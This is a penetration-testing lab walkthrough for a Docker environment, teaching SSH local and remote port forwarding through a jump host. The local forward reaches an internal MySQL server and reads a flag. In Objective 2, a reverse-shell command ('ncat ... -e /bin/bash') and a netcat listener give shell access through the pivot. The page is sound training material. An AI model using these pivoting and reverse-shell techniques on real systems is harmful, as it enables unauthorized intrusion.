---
title: "SSH Tunneling Lab – Local and Remote Port Forwarding"
date: 2026-02-06T19:56:34-08:00
draft: true
description: "SSH tunneling lab for penetration testing. Practice local (-L) and remote (-R) port forwarding with Docker. Pivot through a jump host to reach internal MySQL and receive reverse shells."
noindex: false
featured: false
pinned: false
# comments: false
series:
  - labs
categories:
  - tunneling
tags:
  - ssh
  - tunneling

images:
#  - 
authors:
  - Rob
# menu:
#   main:
#     weight: 100
#     params:
#       icon:
#         vendor: bs
#         name: book
#         color: '#e24d0e'
meta:
  reading_time: false
  date: false
---

## Introduction

| Repo | ⭐ Please give a [Star](https://github.com/rootandbeer/ssh-tunneling-lab) if you enjoyed this lab ⭐ |
| --- | --- |
| Downloads | [![GitHub Clones](https://img.shields.io/badge/dynamic/json?color=success&label=Clone&query=count&url=https://gist.githubusercontent.com/rootandbeer/b7ba3d389cc20606bb343135cbe3b7e7/raw/clone.json&logo=github)](https://github.com/MShawon/github-clone-count-badge) |
| Stars | ![GitHub Repo stars](https://img.shields.io/github/stars/rootandbeer/ssh-tunneling-lab?style=flat&labelColor=grey&color=blue&logo=github) |
| Prerequisites | [Docker-ce](https://www.kali.org/docs/containers/installing-docker-on-kali/), SSH client, [mysql-client](https://dev.mysql.com/doc/refman/8.0/en/mysql.html) (for Objective 1) |
| Difficulty | ![Static Badge](https://img.shields.io/badge/medium-orange) |

This lab demonstrates SSH tunneling and pivoting. You have SSH access to a jump host (pivot) that can reach an internal server; in a real engagement, only the pivot would have that access. You will use **local port forwarding (-L)** to reach the internal MySQL server through the pivot, and **remote port forwarding (-R)** to receive a reverse shell from the internal server through the pivot. For more on the concepts, see [SSH Tunneling](/docs/post-exploitation/tunneling/ssh/).

---

## Lab Environment

| Description | Hostname | External IP | Internal IP | Port | Credentials |
| --- | --- | --- | --- | --- | --- |
| Jump / Pivot | pivot | 172.26.0.10 | 192.168.50.2 | 22 | pivotuser:PivotPass123 |
| Internal server | internal | — | 192.168.50.10 | 22, 3306 | internaluser:InternalPass123 (SSH), root:MySQLRootPass123 (MySQL) |

---

## Setup

Clone the repository:

```shell
git clone https://github.com/rootandbeer/ssh-tunneling-lab
cd ssh-tunneling-lab
```

\
Start the environment:

```shell
docker compose up -d
```

>[!warning] Wait for MySQL to be ready (about 30–60 seconds).

---

## Objective 1 – Local Port Forwarding (reach MySQL via pivot)

**Goal:** Connect your MySQL client to the internal server at `192.168.50.10:3306` by tunneling through the pivot.

**How it works:** You run `ssh -L` on your host. That opens port `13306` on your host. When you connect to `127.0.0.1:13306` with the MySQL client, SSH sends that traffic through the tunnel to the pivot, and the pivot connects to `192.168.50.10:3306`.

>[!note] Terminal 1 – Create the local forward. 
>
>Leave this session open.
>
>```shell
>ssh -L 13306:192.168.50.10:3306 -p 22 pivotuser@172.26.0.10
># Password: PivotPass123
>```

>[!important] Terminal 2 – Connect the MySQL client to the local end of the tunnel:
>
>```shell
>mysql -h 127.0.0.1 -P 13306 -u root -p
># Password: MySQLRootPass123
>```
>
>Verify connection:
>
>```sql
>SHOW DATABASES;
>USE app;
>SELECT * FROM credentials;
>```
>You should see the row with `FLAG{ssh_tunnel_mysql_pivot}`.

\
**Summary:** Your host (`127.0.0.1:13306`) → SSH tunnel → pivot → `192.168.50.10:3306` (MySQL).

---

## Objective 2 – Remote Port Forwarding (reverse shell from internal server)

**Goal:** Get a reverse shell from the internal server (192.168.50.10) to your host by forwarding a listener through the pivot.

**How it works:** You run `nc` on your host on port **9444**. You run `ssh -R` so the pivot listens on **4444** and forwards to your host:9444. The internal server connects to the pivot at 192.168.50.2:4444; the pivot sends that through the tunnel to your listener.

This uses 3 terminals:

>[!note] Terminal 1 - Start the listener. Leave it running.
>
>```shell
>nc -lvnp 9444
>```


>[!important] Terminal 2 – Create the remote forward. Leave this session open.
>
>```shell
>ssh -R 0.0.0.0:4444:127.0.0.1:9444 -p 22 pivotuser@172.26.0.10
># Password: PivotPass123
>```

>[!warning] Terminal 3 – Reach the internal server 
>First SSH into the pivot host
>
>```shell
>ssh -p 22 pivotuser@172.26.0.10
># Password: PivotPass123
>```
>
>\
>SSH to the internal server
>
>```shell
>ssh internaluser@192.168.50.10
># Password: InternalPass123
>```
>
>\
>Once connected setup the reverse shell:
>
>```shell
>ncat 192.168.50.2 4444 -e /bin/bash
>```

\
You should get a shell in `terminal 1` where `nc -lvnp 9444` is running on your host.

**Summary:** 192.168.50.10 → 192.168.50.2:4444 (pivot) → SSH tunnel → your host:9444.

---

## Cleanup

Stop and remove the Docker containers:

```shell
docker compose down
```

\
To remove the MySQL data volume as well:

```shell
docker compose down -v
```

---

\
⭐ Please give a [Star](https://github.com/rootandbeer/ssh-tunneling-lab) if you enjoyed this lab ⭐
